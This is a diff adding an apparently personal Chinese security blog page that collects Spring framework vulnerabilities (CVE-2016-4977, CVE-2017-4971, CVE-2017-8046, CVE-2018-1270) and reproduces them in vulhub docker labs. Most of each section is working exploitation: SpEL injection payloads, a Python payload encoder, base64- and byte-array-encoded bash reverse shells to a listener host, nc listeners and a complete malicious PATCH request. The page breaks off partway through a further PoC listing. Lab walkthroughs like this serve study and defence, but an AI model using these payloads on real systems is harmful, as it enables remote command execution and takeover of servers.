@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Spring漏洞合集 | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Spring漏洞合集</h2>
+  <p class="post-date">2021-06-28</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Spring是一个开源的JAVA框架平台，它由Rod Johnson创建。为了解决企业应用开发的复杂性而创建的。Spring使用基本的JavaBean来完成以前只可能由EJB完成的事情。然而，Spring的用途不仅限于服务器端的开发。从简单性、可测试性和松耦合的角度而言，任何Java应用都可以从Spring中受益，Spring是一个轻量级的控制反转(IoC)和面向切面(AOP)的容器框架。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境使用<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">P牛</a>的docker环境来直接拉取docker文件运行即可；以下漏洞均使用docker来运行。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200821100350190.png" alt="image-20200821100350190"></p>
+<h3 id="漏洞分类实战"><a href="#漏洞分类实战" class="headerlink" title="漏洞分类实战"></a>漏洞分类实战</h3><h4 id="CVE-2016-4977"><a href="#CVE-2016-4977" class="headerlink" title="CVE-2016-4977"></a>CVE-2016-4977</h4><h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p>
+<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>2.0.0 to 2.0.9</p>
+<p>1.0.0 to 1.0.5</p>
+<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Spring的一个错误页面，对用户传的参数的递归解析，从而导致SpEL注入；最终获得服务器权限。</p>
+<h5 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>用户、密码</p>
+<h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、检测搭建完成与否</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;URL访问</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.210:8080</span><br><span class="line">&#x2F;&#x2F;访问如下图即安装完成</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200821104042955.png" alt="image-20200821104042955"></p>
+<p>2、访问URL尝试登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.210:8080&#x2F;oauth&#x2F;authorize?response_type&#x3D;token&amp;client_id&#x3D;acme&amp;redirect_uri&#x3D;si1ent</span><br></pre></td></tr></table></figure>
+
+<p>首先需要填写用户名和密码，我们这里填入<code>admin:admin</code>即可。</p>
+<p><img src="/images/Spring/image-20200821102441175.png" alt="image-20200821102441175"></p>
+<p>输入用户名及密码得到以下信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.210:8080&#x2F;oauth&#x2F;authorize?response_type&#x3D;token&amp;client_id&#x3D;acme&amp;redirect_uri&#x3D;si1ent</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200821102703135.png" alt="image-20200821102703135"></p>
+<p>3、输入SpEL表达式payload</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/10380701.html">参考原理介绍</a></p>
+<p><code>$&#123;3*3&#125;</code>得到以下值，验证语句被执行。</p>
+<p><img src="/images/Spring/image-20200821102909235.png" alt="image-20200821102909235"></p>
+<p>4、反弹shell</p>
+<p>拉取的docker.yml文件夹内包含有poc.py文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># poc文件主要对编码后的语句生成对应的SpEL表达式</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&#x27;Enter message to encode:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&#x27;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#x27;</span> % <span class="built_in">ord</span>(message[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   poc += <span class="string">&#x27;.concat(T(java.lang.Character).toString(%s))&#x27;</span> % <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line">poc += <span class="string">&#x27;)&#125;&#x27;</span></span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure>
+
+<p>poc需要python3.x才行！！</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//bash脚本</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.3.210/3333 0&gt;&amp;1</span><br><span class="line"><span class="meta">#</span><span class="bash"> bash命令主要用于反弹至外部主机监听的主机上；</span></span><br></pre></td></tr></table></figure>
+
+<p>使用以下网站进行编码处理</p>
+<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">payload在线</a></p>
+<p><img src="/images/Spring/image-20200821143514096.png" alt="image-20200821143514096"></p>
+<p>5、生成payload</p>
+<p>发现生成的payload的值内容字符前、后和上面一致(*<em>${3</em>3}**)</p>
+<p>执行poc后输入编码的bash命令，如下图所示：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 第一：bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.3.210/3333 0&gt;&amp;1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 第二：编码</span></span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMjEwLzMzMzMgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 第三部：执行poc.py获得SpEL表达式</span></span><br><span class="line">内容直接输出到终端</span><br></pre></td></tr></table></figure>
+
+<p>6、本地监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3333</span><br></pre></td></tr></table></figure>
+
+<p>7、URL构造</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//对$&#123;3*3&#125;进行替换至生成的payload</span><br><span class="line">http://192.168.3.210:8080/oauth/authorize?response_type=$&#123;3*3&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=si1ent</span><br></pre></td></tr></table></figure>
+
+<p>8、观察反弹情况</p>
+<p>shell反弹成功。</p>
+<p><img src="/images/Spring/image-20200821150056423.png" alt="image-20200821150056423"></p>
+<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ul>
+<li>使用1.0.x版本的用户应放弃在认证通过和错误这两个页面中使用<code>Whitelabel</code>这个视图。</li>
+<li>使用2.0.x版本的用户升级到2.0.10以及更高的版本</li>
+</ul>
+<h4 id="CVE-2017-4971"><a href="#CVE-2017-4971" class="headerlink" title="CVE-2017-4971"></a>CVE-2017-4971</h4><h5 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>
+<h5 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h5><p>Spring WebFlow 2.4.0 ~ 2.4.4</p>
+<h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>如控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>
+<h5 id="漏洞条件-1"><a href="#漏洞条件-1" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>用户账户、密码</p>
+<h5 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、检测搭建完成情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;访问以下URL，显示一个酒店系统。spring-webflow官方示例</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.210:8080&#x2F;login</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200821154631163.png" alt="image-20200821154631163"></p>
+<p>2、任意账户登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">keith&#x2F;melbourne</span><br><span class="line">erwin&#x2F;leuven</span><br><span class="line">jeremy&#x2F;atlanta</span><br><span class="line">scott&#x2F;rochester</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200821154936267.png" alt="image-20200821154936267"></p>
+<p><img src="/images/Spring/image-20200821155020411.png" alt="image-20200821155020411"></p>
+<p><img src="/images/Spring/image-20200821155101140.png" alt="image-20200821155101140"></p>
+<p>随机访问View Hotel</p>
+<p><img src="/images/Spring/image-20200821155136367.png" alt="image-20200821155136367"></p>
+<p>点击预订按钮：Book Hotel</p>
+<p><img src="/images/Spring/image-20200821155222392.png" alt="image-20200821155222392"></p>
+<p>填写数据后点击：Process</p>
+<p><img src="/images/Spring/image-20200821155403680.png" alt="image-20200821155403680"></p>
+<p><img src="/images/Spring/image-20200821155421989.png" alt="image-20200821155421989"></p>
+<p>点击确认：Confirm，此时进行数据拦截</p>
+<p>拦截<code>post请求不要发送</code>，切记，切记，切记！！添加一个如下参数</p>
+<p><img src="/images/Spring/image-20200821160540089.png" alt="image-20200821160540089"></p>
+<p>nc监听</p>
+<p><img src="/images/Spring/image-20200821161428121.png" alt="image-20200821161428121"></p>
+<p>反弹shell（进行URL编码处理）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_(new java.lang.ProcessBuilder(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.3.210/3333 0&gt;&amp;1&quot;</span>)).start()=si1ent</span><br><span class="line">&amp;_(new+java.lang.ProcessBuilder(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash+-i+&gt;%26+/dev/tcp/192.168.3.210/3333+0&gt;%261&quot;</span>)).start()=si1ent</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200821163205134.png" alt="image-20200821163205134"></p>
+<p>反弹成功</p>
+<p><img src="/images/Spring/image-20200821163434752.png" alt="image-20200821163434752"></p>
+<h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>更新至最新版本，Spring WebFlow 2.4.5不受影响</p>
+<h4 id="CVE-2017-8046"><a href="#CVE-2017-8046" class="headerlink" title="CVE-2017-8046"></a>CVE-2017-8046</h4><h5 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Spring Data REST是一个构建在Spring Data之上，为了帮助开发者更加容易地开发REST风格的Web服务。在REST API的Patch方法中（实现<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc6902">RFC6902</a>），path的值被传入<code>setValue</code>，导致执行了SpEL表达式，触发远程命令执行漏洞。</p>
+<p>恶意攻击者使用精心构造的JSON数据包，向spring-data-rest服务器提交恶意PATCH请求，可以执行任意的Java代码。</p>
+<h5 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h5><p>Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本</p>
+<p>Spring Boot 2.0.0M4之前的版本</p>
+<p>Spring Data release trains Kay-RC3之前的版本</p>
+<h5 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>path的值被传入<code>setValue</code>，导致执行了SpEL表达式，触发远程命令执行漏洞。</p>
+<h5 id="漏洞条件-2"><a href="#漏洞条件-2" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>无</p>
+<h5 id="漏洞检测-2"><a href="#漏洞检测-2" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.210:8080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>如果返回JSON，说明这是一个Restful风格的API服务器</p>
+<p><img src="/images/Spring/image-20200821165944028.png" alt="image-20200821165944028"></p>
+<p>2、获取客人信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.210:8080&#x2F;customers&#x2F;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200821170227683.png" alt="image-20200821170227683"></p>
+<p>3、使用PATCH请求资源</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST传输值：</span><br><span class="line">[&#123; <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;))/lastname&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;si1ent&quot;</span> &#125;]</span><br></pre></td></tr></table></figure>
+
+<p>path的值是SpEL表达式，发送上述数据包，将执行<code>new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;</code>表示的命令<code>touch /tmp/success</code></p>
+<p>4、反弹shell</p>
+<p>以下shell进行bytecode</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一：</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">3.210</span>/<span class="number">3333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">第二：(转换部分参考以上在线工具即可)</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMjEwLzMzMzMgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">第三：获取</span><br><span class="line"><span class="number">98</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">32</span>,<span class="number">45</span>,<span class="number">99</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">111</span>,<span class="number">44</span>,<span class="number">89</span>,<span class="number">109</span>,<span class="number">70</span>,<span class="number">122</span>,<span class="number">97</span>,<span class="number">67</span>,<span class="number">65</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">83</span>,<span class="number">65</span>,<span class="number">43</span>,<span class="number">74</span>,<span class="number">105</span>,<span class="number">65</span>,<span class="number">118</span>,<span class="number">90</span>,<span class="number">71</span>,<span class="number">86</span>,<span class="number">50</span>,<span class="number">76</span>,<span class="number">51</span>,<span class="number">82</span>,<span class="number">106</span>,<span class="number">99</span>,<span class="number">67</span>,<span class="number">56</span>,<span class="number">120</span>,<span class="number">79</span>,<span class="number">84</span>,<span class="number">73</span>,<span class="number">117</span>,<span class="number">77</span>,<span class="number">84</span>,<span class="number">89</span>,<span class="number">52</span>,<span class="number">76</span>,<span class="number">106</span>,<span class="number">77</span>,<span class="number">117</span>,<span class="number">77</span>,<span class="number">106</span>,<span class="number">69</span>,<span class="number">119</span>,<span class="number">76</span>,<span class="number">122</span>,<span class="number">77</span>,<span class="number">122</span>,<span class="number">77</span>,<span class="number">122</span>,<span class="number">77</span>,<span class="number">103</span>,<span class="number">77</span>,<span class="number">68</span>,<span class="number">52</span>,<span class="number">109</span>,<span class="number">77</span>,<span class="number">81</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">125</span>,<span class="number">124</span>,<span class="number">123</span>,<span class="number">98</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">54</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">45</span>,<span class="number">100</span>,<span class="number">125</span>,<span class="number">124</span>,<span class="number">123</span>,<span class="number">98</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">44</span>,<span class="number">45</span>,<span class="number">105</span>,<span class="number">125</span></span><br><span class="line">以上字符进行替换！！</span><br></pre></td></tr></table></figure>
+
+<p>替换后</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123; <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,77,117,77,106,69,119,76,122,77,122,77,122,77,103,77,68,52,109,77,81,61,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125&#125;))/lastname&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;si1ent&quot;</span> &#125;]</span><br></pre></td></tr></table></figure>
+
+<p>5、监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3333</span><br></pre></td></tr></table></figure>
+
+<p>6、反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PATCH /customers/1 HTTP/1.1</span><br><span class="line">Host: 192.168.3.210:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json-patch+json</span><br><span class="line">Content-Length: 202</span><br><span class="line"></span><br><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,77,117,77,106,69,119,76,122,77,122,77,122,77,103,77,68,52,109,77,81,61,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125&#125;))/lastname&quot;, &quot;value&quot;: &quot;si1ent&quot; &#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200821204840071.png" alt="image-20200821204840071"></p>
+<p><img src="/images/Spring/image-20200821204859453.png" alt="image-20200821204859453"></p>
+<h5 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>升级到以下最新版本：</p>
+<ul>
+<li>Spring Data REST 2.5.12, 2.6.7, 3.0 RC3</li>
+<li>Spring Boot 2.0.0.M4</li>
+<li>Spring Data release train Kay-RC3</li>
+</ul>
+<h4 id="CVE-2018-1270"><a href="#CVE-2018-1270" class="headerlink" title="CVE-2018-1270"></a>CVE-2018-1270</h4><h5 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，</p>
+<p>在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用<code>StandardEvaluationContext</code>解析，造成命令执行漏洞。</p>
+<p>spring-messaging模块实现STOMP（Simple Text-Orientated Messaging Protocol）协议，通过WebSocket进行STOMP报文的数据交互。攻击者可以通过建立WebSocket连接并发送一条消息造成远程代码执行。</p>
+<h5 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h5><p>Spring Framework 5.0 to 5.0.4</p>
+<p>Spring Framework 4.3 to 4.3.14</p>
+<h5 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用<code>StandardEvaluationContext</code>解析，造成命令执行漏洞。</p>
+<p>漏洞产生于spring-messaging组件，对于使用Spring框架的应用系统，首先排查是否引入了spring-messaging组件并实现STOMP消息传送功能，查看Spring Framework的版本是否在受影响范围内。</p>
+<p>该漏洞是订阅的时候插入SpEL表达式，而对方向这个订阅发送消息时才会触发</p>
+<h5 id="漏洞条件-3"><a href="#漏洞条件-3" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>无</p>
+<h5 id="漏洞检测-3"><a href="#漏洞检测-3" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>网上大部分文章都说spring messaging是基于websocket通信，其实不然。spring messaging是基于sockjs（可以理解为一个通信协议），而sockjs适配多种浏览器：现代浏览器中使用websocket通信，老式浏览器中使用ajax通信。</p>
+<p>连接后端服务器的流程：</p>
+<ol>
+<li>用<a target="_blank" rel="noopener" href="http://jmesnil.net/stomp-websocket/doc/">STOMP协议</a>将数据组合成一个文本流</li>
+<li>用<a target="_blank" rel="noopener" href="https://github.com/sockjs/sockjs-client">sockjs协议</a>发送文本流，sockjs会选择一个合适的通道：websocket或xhr(http)，与后端通</li>
+</ol>
+<p>因此可以使用http来复现漏洞，称之为“降维打击”。</p>
+<p>P牛docker目录下存放一个用于检测漏洞的poc，修改对应IP和bash即可。</p>
+<p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.216:8080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Spring/image-20200822101638648.png" alt="image-20200822101638648"></p>
+<p>2、向订阅地址发送SpEL表达式来出发漏洞，传输数据也包含一定局限性。</p>
+<ol>
+<li>基础地址，在vulhub中为<code>http://your-ip:8080/gs-guide-websocket</code>如下图所示：</li>
+</ol>
+<p><img src="/images/Spring/image-20200822112714858.png" alt="image-20200822112714858"></p>
+<ol>
+<li>待执行的SpEL表达式，如<code>T(java.lang.Runtime).getRuntime().exec(&#39;touch /tmp/success&#39;)</code></li>
+<li>某一个订阅的地址，如vulhub中为：<code>/topic/greetings</code></li>
+<li>如何触发这个订阅，即如何让后端向这个订阅发送消息。在vulhub中，我们向<code>/app/hello</code>发送一个包含name的json，即可触发这个事件。当然在实战中就不同了，所以这个poc并不具有通用性。</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 